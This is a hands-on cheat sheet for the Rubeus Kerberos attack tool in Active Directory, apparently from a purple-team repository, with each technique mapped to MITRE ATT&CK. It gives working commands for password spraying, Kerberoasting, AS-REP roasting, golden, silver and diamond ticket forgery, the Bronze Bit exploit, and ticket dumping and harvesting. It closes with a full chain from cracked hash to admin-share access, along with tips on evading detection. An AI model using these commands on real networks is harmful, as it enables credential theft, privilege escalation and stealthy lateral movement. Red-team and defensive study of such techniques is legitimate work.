# Rubeus — Hands-On Use Cases

Every command below is verified against [`GhostPack/Rubeus`](https://github.com/GhostPack/Rubeus)'s README and source (`Rubeus/Commands/*.cs`, `Rubeus/lib/*.cs`). Switch names, defaults, and behavior match the source exactly — none are inferred from memory.

## Contents
- [Requesting a TGT From a Password or Hash (Over-Pass-the-Hash)](#requesting-a-tgt-from-a-password-or-hash-over-pass-the-hash)
- [Requesting a TGT via PKINIT Certificate Authentication](#requesting-a-tgt-via-pkinit-certificate-authentication)
- [Requesting a Service Ticket Directly via AS-REQ](#requesting-a-service-ticket-directly-via-as-req)
- [Requesting and Applying a Service Ticket From a TGT](#requesting-and-applying-a-service-ticket-from-a-tgt)
- [Renewing a TGT](#renewing-a-tgt)
- [Kerberos Password Brute-Forcing and Spraying](#kerberos-password-brute-forcing-and-spraying)
- [Scanning for Accounts Without Kerberos Pre-Authentication](#scanning-for-accounts-without-kerberos-pre-authentication)
- [Constrained Delegation Abuse — S4U2Self/S4U2Proxy](#constrained-delegation-abuse--s4u2selfs4u2proxy)
- [Cross-Domain S4U and the Bronze Bit Exploit](#cross-domain-s4u-and-the-bronze-bit-exploit)
- [Substituting a Service Name Into an Existing Ticket](#substituting-a-service-name-into-an-existing-ticket)
- [Forging a Golden Ticket](#forging-a-golden-ticket)
- [Forging a Silver Ticket](#forging-a-silver-ticket)
- [Forging a Diamond Ticket](#forging-a-diamond-ticket)
- [Pass-the-Ticket, Purging, and Describing a Ticket](#pass-the-ticket-purging-and-describing-a-ticket)
- [Triaging, Listing, and Dumping Cached Tickets](#triaging-listing-and-dumping-cached-tickets)
- [Unprivileged TGT Extraction via tgtdeleg](#unprivileged-tgt-extraction-via-tgtdeleg)
- [Harvesting TGTs From Unconstrained-Delegation Hosts](#harvesting-tgts-from-unconstrained-delegation-hosts)
- [Kerberoasting](#kerberoasting)
- [AS-REP Roasting](#as-rep-roasting)
- [Resetting a User's Password From a Stolen TGT](#resetting-a-users-password-from-a-stolen-tgt)
- [Calculating Kerberos Encryption Keys](#calculating-kerberos-encryption-keys)
- [Sacrificial-Process and Logon-Session Recon](#sacrificial-process-and-logon-session-recon)
- [Chained Workflow — BloodHound-Identified Delegation Abuse to Lateral Movement](#chained-workflow--bloodhound-identified-delegation-abuse-to-lateral-movement)

---

## Requesting a TGT From a Password or Hash (Over-Pass-the-Hash)

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) (Steal or Forge Kerberos Tickets); functionally an over-pass-the-hash technique, adjacent to [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Pass the Hash) in intent

```
Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
```

Builds an AS-REQ for `dfm.a`, encrypts pre-auth with the supplied RC4 (NTLM) hash, and immediately imports the resulting TGT into the current logon session with `/ptt`. Swap `/rc4` for `/aes128`/`/aes256`/`/des`, or use `/password:X` (defaults the exchange to RC4 unless `/enctype:` overrides it). No elevation required.

```
Rubeus.exe asktgt /user:dfm.a /aes256:e27b2e...c3bd27 /createnetonly:C:\Windows\System32\cmd.exe
```

Elevated variant: spawns a hidden sacrificial `cmd.exe` (logon type 9) and applies the ticket there instead of the current session, avoiding stomping the operator's own TGT — `/luid` and `/createnetonly` both require elevation.

## Requesting a TGT via PKINIT Certificate Authentication

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates)

```
Rubeus.exe asktgt /user:harmj0y /domain:rubeus.ghostpack.local /dc:pdc1.rubeus.ghostpack.local /getcredentials /certificate:MIIR3QIB...(pfx-base64)...
```

RFC 4556 PKINIT authentication using a leaked/stolen PFX certificate instead of a password/hash — the ADCS-abuse companion to Kerberos ticket requests. `/getcredentials` automatically follows up with a U2U service-ticket request to recover the account's **NT hash**, converting certificate access straight into a reusable hash. `/password:X` supplies the PFX's own store password if it's protected.

## Requesting a Service Ticket Directly via AS-REQ

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting) — this is a lesser-known Kerberoasting variant

```
Rubeus.exe asktgt /user:svc_sql /rc4:HASH /service:MSSQLSvc/sql01.corp.local:1433 /ptt
```

`asktgt`'s `/service:SPN` flag requests a **service ticket directly via AS-REQ**, skipping the separate TGT + `asktgs` round trip entirely — a targeted, single-account Kerberoasting path useful when the operator already knows the target account and its key, without touching LDAP at all.

## Requesting and Applying a Service Ticket From a TGT

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket)

```
Rubeus.exe asktgs /ticket:doIFmjCC...(kirbi-base64)... /service:cifs/fileserver.corp.local,ldap/dc01.corp.local /ptt
```

Requests one or more (comma-separated) service tickets from an existing TGT. The KDC returns the highest mutually supported encryption type unless `/enctype:` forces one. `/enterprise` requests using a UPN-style enterprise principal for cross-forest scenarios; `/opsec` reshapes the TGS-REQ to look more like a genuine client request and automatically sends a follow-up TGS-REQ when the target is configured for unconstrained delegation.

## Renewing a TGT

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/)

```
Rubeus.exe renew /ticket:doIFmjCC...(kirbi-base64)... /ptt /autorenew
```

Renews a TGT toward its `renewtill` limit; `/autorenew` keeps renewing automatically as the ticket approaches expiry rather than a single one-shot renewal — useful for keeping a long-running implant's Kerberos access alive without re-requesting from scratch (and without the fresh AS-REQ that a re-request would generate).

## Kerberos Password Brute-Forcing and Spraying

**MITRE ATT&CK:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) (Password Guessing) / [T1110.003](https://attack.mitre.org/techniques/T1110/003/) (Password Spraying)

```
Rubeus.exe brute /password:Password123!! /noticket
Rubeus.exe spray /passwords:pwlist.txt /users:users.txt /domain:corp.local /noticket
```

Kerberos-native credential validation — sends AS-REQ's directly rather than authenticating via SMB/LDAP/WinRM the way `NetExec`-style tools do; `brute` and `spray` are the same action under two names. `/noticket` skips requesting a full TGT on a hit (recon-only, quieter); omitting it retrieves and displays a usable TGT for every valid credential found. Automatically skips accounts flagged Blocked/Disabled.

## Scanning for Accounts Without Kerberos Pre-Authentication

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Domain Account Discovery) — the reconnaissance precursor to AS-REP roasting

```
Rubeus.exe preauthscan /users:usernames.txt /domain:corp.local /dc:dc01.corp.local
```

Sends an AS-REQ per candidate username and reports whether pre-authentication is required, without needing any prior LDAP read — useful when LDAP is more tightly monitored than raw Kerberos, or when working from a username list obtained elsewhere (OSINT, a prior breach dump) rather than a live directory query.

## Constrained Delegation Abuse — S4U2Self/S4U2Proxy

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) (Steal or Forge Kerberos Tickets) — no dedicated ATT&CK sub-technique exists specifically for constrained-delegation abuse

```
Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a /msdsspn:"ldap/PRIMARY.testlab.local" /altservice:cifs /ptt
```

One-shot chain: requests a TGT for `patsy` (an account with `TrustedToAuthForDelegation` + `msDS-AllowedToDelegateTo`), runs S4U2Self to get a forwardable ticket impersonating `dfm.a`, runs S4U2Proxy against the target SPN, substitutes the sname for `cifs` via `/altservice`, and imports the result — turning read access to one nominal LDAP SPN into filesystem access on the same server, entirely from the delegation-trusted account's key with zero `dfm.a` credential material needed. Prerequisite discovery for which accounts are delegation-trusted is a BloodHound (`AllowedToDelegate` edge) job — see the chained-workflow scenario below.

## Cross-Domain S4U and the Bronze Bit Exploit

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/); Bronze Bit specifically implements **CVE-2020-17049**

```
# Cross-domain S4U
Rubeus.exe s4u /user:patsy /rc4:HASH /impersonateuser:dfm.a /msdsspn:"cifs/target.other.local" /targetdomain:other.local /targetdc:dc1.other.local /ptt

# Bronze Bit — flips the forwardable flag on a Protected Users S4U2Self ticket
Rubeus.exe s4u /user:patsy /rc4:HASH /impersonateuser:protected_admin /msdsspn:"cifs/target.corp.local" /bronzebit /ptt
```

`/targetdomain`/`/targetdc` extend S4U across a trust boundary. `/bronzebit` is a distinct exploit: normally, S4U2Self tickets for **Protected Users**-group members come back non-forwardable, blocking S4U2Proxy from using them — Bronze Bit decrypts and re-encrypts the S4U2Self ticket to flip the flag by force, which requires the service account's own long-term key (not just a TGT) since the ticket must be genuinely re-signed.

## Substituting a Service Name Into an Existing Ticket

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) — a supporting utility for RBCD/S4U chains, not a standalone technique

```
Rubeus.exe tgssub /ticket:doIGujCC...(kirbi-base64)... /altservice:cifs/fileserver.corp.local /ptt
```

Rewrites the `sname` field of an already-obtained service ticket without re-running the whole S4U chain — the same alternate-service trick `/altservice` performs inline within `s4u`, exposed as a standalone command for reuse against a ticket obtained elsewhere (e.g. Resource-Based Constrained Delegation abuse where the S4U2Self ticket was captured by another tool).

## Forging a Golden Ticket

**MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Golden Ticket)

```
Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /ptt
```

`/ldap` queries the DC for `harmj0y`'s real group memberships, RID, and domain password policy to populate a realistic PAC automatically, then mounts/unmounts `SYSVOL` to read the policy file's `MinimumPasswordAge`/`MaximumPasswordAge`. Fully offline otherwise — this generates **zero** Kerberos traffic for the forge itself.

```
Rubeus.exe golden /aes256:HASH /user:harmj0y /id:1106 /domain:corp.local /sid:S-1-5-21-... /groups:513 /netbios:CORP /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /oldpac
```

Fully manual PAC construction (no LDAP touch at all — the quietest option). `/oldpac` deliberately omits the newer Requestor/Attributes PAC buffers Microsoft added for **CVE-2021-42287**, matching an older, less-scrutinized ticket shape. Default `/flags` is `forwardable,renewable,pre_authent,initial`; default `/groups` is `520,512,513,519,518` with `/pgid` (513) folded in; default `/endtime`/`/renewtill` are `10h`/`7d` relative to start.

## Forging a Silver Ticket

**MITRE ATT&CK:** [T1558.002](https://attack.mitre.org/techniques/T1558/002/) (Silver Ticket)

```
Rubeus.exe silver /service:cifs/SQL1.corp.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /user:ccob /krbkey:6a8941dc...ae3d5 /krbenctype:aes256 /domain:corp.local /ptt
```

Forges a service ticket for `ccob` to `cifs/SQL1.corp.local`, encrypted with the **service account's** own RC4 key, but signs the KDCChecksum/TicketChecksum with a separately-supplied `krbtgt` AES256 key (`/krbkey`) — matching what a real DC-issued ticket's checksums would use even though the encrypting key is weaker. Without `/krbkey`, the same key used to encrypt the ticket also signs the checksums.

```
Rubeus.exe silver /user:exploitph /ldap /service:krbtgt/dev.corp.local /rc4:HASH
```

A **referral TGT** forge — targeting `krbtgt/<child-or-trusted-domain>` instead of a normal service produces a cross-domain referral ticket, useful in multi-domain forests where the operator holds a trust key but not the target domain's own `krbtgt` key. `/nofullpacsig` omits the FullPacChecksum Microsoft added for **CVE-2022-37967** (included by default on any ticket not signed with the real `krbtgt` key).

## Forging a Diamond Ticket

**MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Golden Ticket) — ATT&CK has no dedicated ID for the Diamond variant; same parent technique as `golden`, distinguished by mechanism (see `01`)

```
Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce69328c9071cba14bef4dbb02b1cfeb9c /user:loki /password:Mischief$ /enctype:aes /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104 /groups:512
```

Requests a **real TGT** for `loki` via a genuine AS-REQ (DC-logged Event 4768), then decrypts it with `/krbkey` (the `krbtgt` key), rewrites the PAC to claim `/ticketuser:thor` with `/ticketuserid`/`/groups`, and re-signs/re-encrypts — a surgically edited *real* ticket rather than one built from nothing. `/tgtdeleg` can substitute the initial TGT step with the unprivileged GSS-API delegation trick instead of a password/hash.

## Pass-the-Ticket, Purging, and Describing a Ticket

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Pass the Ticket)

```
Rubeus.exe ptt /ticket:doIFmjCC...(kirbi-base64)...
Rubeus.exe ptt /luid:0x474722b /ticket:doIFmjCC...(kirbi-base64)...   # elevated — another session
Rubeus.exe purge                                                       # clear current session's cache
Rubeus.exe describe /ticket:doIFmjCC...(kirbi-base64)...               # parse and print fields, no import
```

`ptt` uses `LsaCallAuthenticationPackage()` with `KERB_SUBMIT_TKT_REQUEST` — no LSASS memory write. `describe` is read-only, useful for confirming a forged/harvested ticket's `Flags`/`EndTime`/`ServiceName` before deciding whether to import it.

## Triaging, Listing, and Dumping Cached Tickets

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) — ticket-cache enumeration/extraction, the non-LSASS alternative to `sekurlsa::tickets`

```
Rubeus.exe triage                          # summary table, current user
Rubeus.exe triage /service:ldap            # elevated, filtered to a specific service across all sessions
Rubeus.exe klist /luid:0x474722b           # elevated, detailed view of one session
Rubeus.exe dump /service:krbtgt /nowrap    # elevated, full base64 KRB-CRED extraction of every cached TGT
```

`triage`/`klist` are read-only recon over what's cached; `dump` is the actual exfiltration step, returning reusable `.kirbi` blobs. Non-elevated `dump` only returns *usable* service tickets — TGT session keys aren't returned to a non-elevated caller by the underlying API, which is exactly the gap `tgtdeleg` (below) works around.

## Unprivileged TGT Extraction via tgtdeleg

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/)

```
Rubeus.exe tgtdeleg /ptt
```

Uses `AcquireCredentialsHandle()`/`InitializeSecurityContext(ISC_REQ_DELEGATE)` to build a fake delegation context toward `HOST/<current DC>`, extracts the resulting AP-REQ's embedded KRB-CRED, decrypts it using the service ticket's own session key pulled from the local cache — and produces a fully usable TGT **without any elevation at all**, working around the non-elevated `dump` limitation above. `/target:SPN` overrides automatic target-domain detection when needed.

## Harvesting TGTs From Unconstrained-Delegation Hosts

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/)

```
Rubeus.exe monitor /targetuser:DC$ /interval:10
Rubeus.exe harvest /monitorinterval:30 /displayinterval:600 /registry:SOFTWARE\MONITOR
```

The standard play on a host with unconstrained delegation enabled: any account (including a Domain Controller machine account) that authenticates *to* that host hands over its TGT automatically — `monitor` polls every interval for new TGTs and prints them as they arrive (keying off Event 4624 logons); `harvest` goes further, auto-renewing captured TGTs up to their limit and periodically dumping the current usable cache. `/registry:PATH` persists captured output under `HKLM` for later retrieval instead of console-only output. **Requires elevation.**

## Kerberoasting

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting)

```
Rubeus.exe kerberoast /outfile:hashes.txt
```

**Default behavior** — no LDAP filter, no ticket, no flags: enumerates every SPN-bearing account and requests **each one's highest supported encryption type** via `System.IdentityModel.Tokens.KerberosRequestorSecurityToken`. Rubeus prints its own warning on this path: `NOTICE: AES hashes will be returned for AES-enabled accounts.` — meaning the plain default, unlike Impacket's `GetUserSPNs.py` (RC4-biased by default, see `Impacket/GetUserSPNs (Kerberoasting)/`), does **not** force a downgrade and will hand back AES256 hashes (impractical to crack at scale) for any account configured to support them.

```
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

The **opsec-safe RC4 approach**: uses the `tgtdeleg` trick, then LDAP-filters to accounts that **only** support RC4 (`!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24`) — every hash returned is genuinely RC4 because the account has no AES capability at all, not because Rubeus forced it.

```
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
```

The **aggressive RC4 approach**: uses `tgtdeleg`, but roasts *every* SPN-bearing account with RC4 specified regardless of AES support — a genuine encryption downgrade against AES-capable accounts, the loudest of the three main postures.

```
Rubeus.exe kerberoast /aes /outfile:hashes.txt
Rubeus.exe kerberoast /nopreauth:svc_backup /spn:MSSQLSvc/sql01.corp.local:1433 /domain:corp.local
Rubeus.exe kerberoast /pwdsetbefore:01-01-2015 /stats
Rubeus.exe kerberoast /ticket:doIFmjCC...(kirbi-base64)... /spns:spns.txt /delay:5000 /jitter:30
```

`/aes` targets only AES-enabled accounts with the KerberosRequestorSecurityToken method. `/nopreauth:USER` sends AS-REQ's instead of TGS-REQ's — generating Event 4768 instead of the 4769 that most Kerberoast detections are built around. `/stats` enumerates and reports on roastable accounts (password age, enctype breakdown) without sending a single TGS-REQ. Supplying `/ticket:X` lets roasting run from a **non-domain-joined** host with no LDAP query at all, and `/delay`/`/jitter` spread requests out to defeat burst-based detections.

## AS-REP Roasting

**MITRE ATT&CK:** [T1558.004](https://attack.mitre.org/techniques/T1558/004/) (AS-REP Roasting)

```
Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
```

Sends an AS-REQ without pre-auth for every account in the domain with `DONT_REQ_PREAUTH` set, and writes each `$krb5asrep$23$...` hash in Hashcat format (mode `18200`) or the default John the Ripper format. `/user:X`/`/ou:X` scope the target list; `/des` forces DES-etype requests where relevant; `/creduser`/`/credpassword` authenticate the LDAP discovery step with alternate credentials.

## Resetting a User's Password From a Stolen TGT

**MITRE ATT&CK:** [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation)

```
Rubeus.exe changepw /ticket:doIFFjCC...(kirbi-base64)... /new:Password123!
```

The 2014 "Aorato" kpasswd technique — a TGT alone (no separate service ticket needed) is sufficient to reset the same account's own password via RFC 3244 over port 464. `/targetuser:DOMAIN\USER` resets a **different** account's password, provided the TGT-holder has the delegated rights to do so.

## Calculating Kerberos Encryption Keys

```
Rubeus.exe hash /password:Password123! /user:harmj0y /domain:corp.local
```

Utility command — computes `rc4_hmac`, `aes128_cts_hmac_sha1`, `aes256_cts_hmac_sha1`, and `des_cbc_md5` from a known plaintext, for feeding into `/rc4`/`/aes256`/`/des` elsewhere. No MITRE mapping (supporting utility, no execution against a target).

## Sacrificial-Process and Logon-Session Recon

```
Rubeus.exe currentluid
Rubeus.exe logonsession /current
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show /ticket:ticket.kirbi
```

**MITRE ATT&CK:** [T1033](https://attack.mitre.org/techniques/T1033/) (System Owner/User Discovery) for `currentluid`/`logonsession`. `createnetonly` (`CreateProcessWithLogonW`, logon type 9) is the same mechanic `asktgt /createnetonly` invokes internally, exposed standalone so a ticket can be applied to a fresh sacrificial session after the fact rather than at request time.

## Chained Workflow — BloodHound-Identified Delegation Abuse to Lateral Movement

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/), [T1558](https://attack.mitre.org/techniques/T1558/), [T1021](https://attack.mitre.org/techniques/T1021/) (Remote Services)

```
# 1. BloodHound identifies "svc_web" holds AllowedToDelegate → cifs/fileserver.corp.local
#    (see Purple Teaming/BloodHound/ for the collection/query side)

# 2. Kerberoast svc_web to recover its key (opsec-safe posture)
Rubeus.exe kerberoast /user:svc_web /rc4opsec /outfile:svc_web.hash

# 3. Crack the hash offline — see Purple Teaming/Hashcat/
#    hashcat -m 13100 svc_web.hash rockyou.txt -r rules/best66.rule

# 4. Abuse the delegation right with the recovered key
Rubeus.exe s4u /user:svc_web /rc4:RECOVERED_HASH /impersonateuser:administrator /msdsspn:"cifs/fileserver.corp.local" /altservice:cifs,host /ptt

# 5. Lateral movement using the forged access
dir \\fileserver.corp.local\C$
```

This is the realistic end-to-end chain most write-ups skip: BloodHound (attack-path graphing) → `kerberoast` (credential recovery for the delegation-trusted account) → `Hashcat` (offline cracking) → `s4u` (delegation abuse using the recovered key) → lateral movement — each step already documented in its own folder in this repo, chained here rather than re-derived.
